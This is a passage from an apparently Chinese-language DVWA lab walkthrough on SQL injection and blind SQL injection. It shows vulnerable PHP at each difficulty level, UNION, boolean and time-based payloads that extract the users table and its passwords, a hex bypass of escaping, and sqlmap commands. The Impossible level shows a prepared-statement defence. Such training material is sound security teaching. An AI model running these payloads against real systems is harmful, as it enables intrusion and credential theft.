class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Low 级对来自客户端的参数 id 没有进行任何的检查与过滤，存在明显的 SQL 注入。</p>
<h3 id="漏洞利用-17"><a href="#漏洞利用-17" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现实攻击场景中，攻击者是无法看到后端代码的，一些的手工注入步骤建立在无法看到源码的基础上。</p>
<h4 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h4><p>输入 <code>1</code> ,查询成功 &gt;&gt; 输入 <code>1&#39;and 1 = 2 --</code> 查询失败，返回结果为空, 输入 <code>1&#39; and 1=1 --</code> 查询成功 &gt;&gt; 输入 <code>1&#39; or &#39;1234&#39; =&#39;1234</code>,查询成功，且返回多个结果 &gt;&gt; 说明存在字符型注入。</p>
<h4 id="拆解-SQL-查询语句中的字段数"><a href="#拆解-SQL-查询语句中的字段数" class="headerlink" title="拆解 SQL 查询语句中的字段数"></a>拆解 SQL 查询语句中的字段数</h4><blockquote>
<p><code>1&#39; or 1=1 order by 1 #</code> 查询成功<br><code>1&#39; or 1=1 order by 2 #</code> 查询成功<br><code>1&#39; or 1=1 order by 3 #</code> 查询失败</p>
</blockquote>
<p>说明执行的 SQL 查询语句中只有两个字段，即 <code>First name</code> 、<code>Surname</code></p>
<p>也可使用 <code>union seclct 1,2,3...</code> 猜解字段数</p>
<h4 id="确定显示的字段顺序"><a href="#确定显示的字段顺序" class="headerlink" title="确定显示的字段顺序"></a>确定显示的字段顺序</h4><blockquote>
<p><code>1&#39; union select 1,2 #</code> 查询成功</p>
</blockquote>
<p>猜测执行的 SQL 语句为 <code>select First name,Surname from &lt;表&gt; where ID=&#39;$id&#39;</code></p>
<p>而真正的语句为 <code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;</code></p>
<h4 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4><p><code>1&#39; union select 1,database() #</code> 查询成功，获得数据库名为 <code>dvwa</code></p>
<h4 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h4><p><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code> 成功查到 <code>dvwa</code> 中共有两个表， <code>guestbook</code> 与 <code>users</code>。</p>
<p><code>group_concat()</code> 函数将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
<p><code>information_schema</code> 这个数据库中保存了 Mysql 服务器所有数据库的信息，如数据库名，数据库表，表栏的数据类型与访问权限等。</p>
<h4 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h4><p><code>1&#39; union select 1,group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39; #</code> 成功查询到 <code>users</code> 表中有 8 个字段，<code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code></p>
<h4 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h4><p><code>1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password)from users #</code> 成功将 <code>users</code> 表中所有用户的 <code>user_id,first_name,last_name,password</code> 数据</p>
<h4 id="使用-sqlmap-攻击"><a href="#使用-sqlmap-攻击" class="headerlink" title="使用 sqlmap 攻击"></a>使用 sqlmap 攻击</h4><p>使用 Burp Strip Pro 抓包，将抓到的包保存为文本 <code>hack.txt</code></p>
<figure class="highlight txt"><figcaption><span>hack.txt</span></figcaption><table><tr><td class="code"><pre><span class="line">GET /vulnerabilities/sqli/?id=1&amp;Submit=Submit HTTP/1.1</span><br><span class="line">Host: php.local:81</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://php.local:81/vulnerabilities/sqli/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=05djofsqdd62727is2vv7ckeh6; security=low</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p>使用 sqlmap 命令进行攻击</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -r hack.txt --dbs --batch  <span class="comment"># 获取数据库列表</span></span><br><span class="line"></span><br><span class="line">sqlmap -r hack.txt --dbs --batch --current-db  <span class="comment"># 获取当前数据库名</span></span><br><span class="line"></span><br><span class="line">sqlmap -r hack.txt -D dvwa --tables --batch  <span class="comment"># 获取数据库中的表名</span></span><br><span class="line"></span><br><span class="line">sqlmap -r hack.txt -D dvwa -T users --columns --batch  <span class="comment"># 获取表中的列名</span></span><br></pre></td></tr></table></figure>
<h2 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-24"><a href="#源码-24" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = mysqli_fetch_row( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>利用 <code>mysql_escape_string</code> 函数对特殊字符 <code>\x00,\n,\r,\,&#39;,&quot;,\x1a</code> 进行转义，同时前端设置了下拉选择表单，希望控制用户输入。</p>
</blockquote>
<h3 id="漏洞利用-18"><a href="#漏洞利用-18" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="判断是否存在注入，注入是字符型还是数字型-1"><a href="#判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h4><p>通过 Burp Suite Pro 抓包 &gt;&gt; 修改 id 为 <code>1&#39; or 1=1 #</code> 报错 &gt;&gt; 修改 id 为 <code>1 or 1=1 #</code> 查询成功，说明存在数字型注入 (数字型注入，服务段的 <code>mysqli_real_escape_string</code> 函数就形同虚设了，因为数字注入不需要借助引号)</p>
<h4 id="拆解-SQL-查询语句中的字段数-1"><a href="#拆解-SQL-查询语句中的字段数-1" class="headerlink" title="拆解 SQL 查询语句中的字段数"></a>拆解 SQL 查询语句中的字段数</h4><p>抓包 &gt;&gt; 修改 id 为 <code>1 order by 2 #</code> 查询成功 &gt;&gt; 修改 id 为 <code>1 order by 3 #</code> 报错 &gt;&gt; 判断查询语句中只有两个字段，即返回的 <code>First name</code> 、<code>Surname</code></p>
<h4 id="确定显示的字段顺序-1"><a href="#确定显示的字段顺序-1" class="headerlink" title="确定显示的字段顺序"></a>确定显示的字段顺序</h4><p>抓包 &gt;&gt; 修改 id 为 <code>1 union select 1,2 #</code> 查询成功 &gt;&gt; 判断执行的 SQL 语句为 <code>select First name,Surname from &lt;表&gt; where ID=$id</code> (正确的 <code>SELECT first_name, last_name FROM users WHERE user_id = $id;</code>)</p>
<h4 id="获取当前数据库-1"><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4><p>抓包 &gt;&gt; 修改 id 为 <code>1 union select 1,database() #</code> ，查询成功，获得库名 <code>dvwa</code>。</p>
<h4 id="获取数据库中的表-1"><a href="#获取数据库中的表-1" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h4><p>抓包 &gt;&gt; 修改 id 为 <code>1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=database() #</code> 查询成功，获得数据库 <code>dvwa</code> 中的两个表名 <code>guestbook</code>、<code>users</code></p>
<h4 id="获取表中的字段名-1"><a href="#获取表中的字段名-1" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h4><p>抓包 &gt;&gt; 修改 id 为 <code>1 union select 1,group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39; #</code> 查询失败,因为单引号被转义了 &gt;&gt; 利用16进制进行绕过将 <code>&#39;users&#39;</code> 换成 <code>0x7573657273</code> 即可查询成功，获得 <code>users</code> 表中有8个字段。</p>
<h4 id="下载数据-1"><a href="#下载数据-1" class="headerlink" title="下载数据"></a>下载数据</h4><p>抓包 &gt;&gt; 修改 id 为 <code>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password)from users #</code></p>
<h4 id="同-low-级可使用-sqlmap-进行攻击"><a href="#同-low-级可使用-sqlmap-进行攻击" class="headerlink" title="同 low 级可使用 sqlmap 进行攻击"></a>同 low 级可使用 sqlmap 进行攻击</h4><h2 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h2><h3 id="源码-25"><a href="#源码-25" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在 SQL 查询语句中添加了 LIMIT 1 希望控制只输出一个结果。同时设置了将查询提交也与结果显示页分离，不执行302跳转，防止了一般的sqlmap注入(sqlmap 注入过程中，无法在查询页上获得查询结果，也就无法进行下一步了)。</p>
</blockquote>
<h3 id="漏洞利用-19"><a href="#漏洞利用-19" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然添加了 LIMIT 1 但可以通过 <code>#</code> 等注释符将其注释掉</p>
<p><code>1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code></p>
<h2 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-26"><a href="#源码-26" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>采用 PDO 技术，划清了代码与数据的界限，有效防御 SQL 注入，同时只有返回的查询结果数量为一时才会成功输出，这样有效的防御了脱库， <code>Anti-CSRF token</code> 机制的加入进一步提高了安全性。</p>
</blockquote>
<h1 id="SQL-Injection-Blind-SQL-盲注"><a href="#SQL-Injection-Blind-SQL-盲注" class="headerlink" title="SQL Injection(Blind) (SQL 盲注)"></a>SQL Injection(Blind) (SQL 盲注)</h1><p>SQL 盲注不像一般的注入可直接从页面上看到输入语句的执行结果，盲注时无法从显示页面上获取执行结果，甚至连注入语句是否被执行都无法得知，因此盲注的难度比一般注入高。现存的SQL注入漏洞大多是盲注。</p>
<p><strong>手工盲注思路</strong></p>
<p>手工盲注过程完全只能通过返回的 “是” 和 “不是” 两个信息来判断，因此只能构造如 <code>数据库名的第一字母是不是a?</code> 等类似的只有 “是” 和 “不是” 答案的语句获得想要的信息，这类盲注称为 <strong>布尔盲注</strong> 。<br>而通过构造 <code>数据库名的第一字母是a就等等</code> 等通过时间函数延迟情况判断获得信息，这类盲注称为<strong>时间盲注</strong>。</p>
<p>盲注步骤:</p>
<ul>
<li>判断是否存在注入，注入是字符型还是数字型</li>
<li>猜解当前数据库名</li>
<li>猜解数据库中的表名</li>
<li>猜解表中的字段名</li>
<li>猜解数据</li>
</ul>
<h2 id="Low-7"><a href="#Low-7" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-27"><a href="#源码-27" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @mysqli_num_rows( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>对 id 没有任何检查、过滤，返回给页面的结果也只有两种<code>User ID exists in the database.</code> 与 <code>User ID is MISSING from the database.</code> 存在盲注漏洞</p>
</blockquote>
<h3 id="漏洞利用-20"><a href="#漏洞利用-20" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><ul>
<li>判断是否存在注入，注入是字符型还是数字型</li>
</ul>
<p><code>1</code> 显示存在 &gt;&gt; <code>1&#39; and 1=1 #</code> 显示存在 &gt;&gt; <code>1&#39; and 1=2</code> 显示不存在 &gt;&gt; 存在字符型盲注</p>
<ul>
<li>猜解当前数据库名</li>
</ul>
<p>先猜解数据库名的长度，再猜解每一个字符</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(database())=1 <span class="comment">#    显示不存在</span></span><br><span class="line">1&#x27; and length(database())=2 <span class="comment">#    显示不存在</span></span><br><span class="line">1&#x27; and length(database())=3 <span class="comment">#    显示不存在</span></span><br><span class="line">1&#x27; and length(database())=4 <span class="comment">#    显示存在，说明数据库名长度为4</span></span><br></pre></td></tr></table></figure>
<p>采用二分法猜解数据库名</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;97 #   显示存在，说明数据库名第一个字母的ascii值大于97</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;122 #   显示存在，说明数据库名第一个字母的ascii值小于122</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;109 #   显示存在，说明数据库名第一个字母的ascii值小于109</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;103 #   显示存在，说明数据库名第一个字母的ascii值小于103</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;100 #   显示不存在，说明数据库名第一个字母的ascii值不小于100</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;100 #   显示不存在，说明数据库名第一个字母的ascii值不大于100</span><br></pre></td></tr></table></figure>
<p>依次猜解出其它数据库名的字母</p>
<ul>
<li>猜解数据库中的表名</li>
</ul>
<p>先猜解数据库表的数量</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and (<span class="keyword">select</span> <span class="keyword">count</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">1</span> <span class="comment">#   显示不存在</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name)from information_schema.tables where table_schema=database())=2 #   显示存在,说明数据库中有两个表</span></span><br></pre></td></tr></table></figure>
<p>猜解表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span> <span class="comment">#    显示存在</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 #    显示存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="number">109</span> <span class="comment">#    显示存在</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 #    显示不存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">103</span> <span class="comment">#    显示不存在</span></span><br></pre></td></tr></table></figure>
<p>说明第一个表的第一个字母为<code>g</code>,同样步骤猜测出两个表名 <code>goustbook , users</code>。</p>
<ul>
<li>猜解表中的字段名</li>
</ul>
<p>猜解表中的字段数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span>)=<span class="number">1</span> <span class="comment"># 显示不存在</span></span><br><span class="line">...</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(column_name)from information_schema.columns where table_name=&#x27;</span><span class="keyword">users</span><span class="string">&#x27;)=8 # 显示存在，说明users表中有8个字段</span></span><br></pre></td></tr></table></figure>
<p>猜解字段名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> linit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span> <span class="comment">#    显示不存在</span></span><br><span class="line">...</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; linit 0,1),1))=7 #    显示存在,说明第一个字段为7个字符长度,然后采用二分法猜解出所有字段名</span></span><br></pre></td></tr></table></figure>
<ul>
<li>猜解数据</li>
</ul>
<p>采用二分法依次猜解</p>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul>
<li>判断是否存在注入，注入是字符型还是数字型</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(5) <span class="comment">#    有明显延迟</span></span><br><span class="line">1 and sleep(5) <span class="comment">#    没有延迟</span></span><br></pre></td></tr></table></figure>
<p>说明存在字符型时间盲注</p>
<ul>
<li>猜解当前数据库名</li>
</ul>
<p>猜解数据库名长度</p>
